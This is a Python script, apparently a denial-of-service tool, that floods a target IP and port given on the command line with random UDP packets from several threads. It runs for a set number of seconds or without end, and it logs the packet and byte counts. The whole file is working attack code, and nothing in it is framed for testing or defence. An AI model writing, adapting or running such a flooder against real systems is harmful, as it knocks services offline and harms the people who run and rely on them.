import os
import sys
import time
import socket
import random
from threading import Thread


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

config = {
    'duration': 5,  # seconds
    'packet-len': 1024,  # bytes
    'ip': '127.0.0.1',
    'port': 3030,
    'timeout': 0,
    'threads': 10,
    'total_packets_sent': 0,
    'total_bytes_sent': 0
}


def start():
    begin = time.time()
    try:
        while config['duration'] == 'inf' or begin + int(config['duration']) > time.time():
            sock.sendto(random._urandom(int(config['packet-len'])), (config['ip'], int(config['port'])))
            config['total_packets_sent'] += 1
            config['total_bytes_sent'] += int(config['packet-len'])
            print('Sent {packets} packets to {ip}:{port}. Bytes sent: {total_packets_len}'.format(
                                                                                            packets=config['total_packets_sent'],
                                                                                            ip=config['ip'],
                                                                                            port=config['port'],
                                                                                            total_packets_len=config['total_bytes_sent']))
            time.sleep(int(config['timeout']))
    except BrokenPipeError:
        print('[ERROR] Router has closed the connection')

    else:
        print('Timeout has been reached')

    os.abort()


if __name__ == '__main__':
    args = sys.argv[1:]
    config['ip'], config['port'] = args[:2]

    arg = 'null'

    try:
        for arg in config.keys():
            if '--' + arg in args:
                config[arg] = args[args.index('--' + arg) + 1]
    except IndexError:
        print('[ERROR] Missing value for --' + arg)

    try:
        for _ in range(int(config['threads'])):
            Thread(target=start).start()
    except KeyboardInterrupt:
        print('\nQuit')
        os.abort()

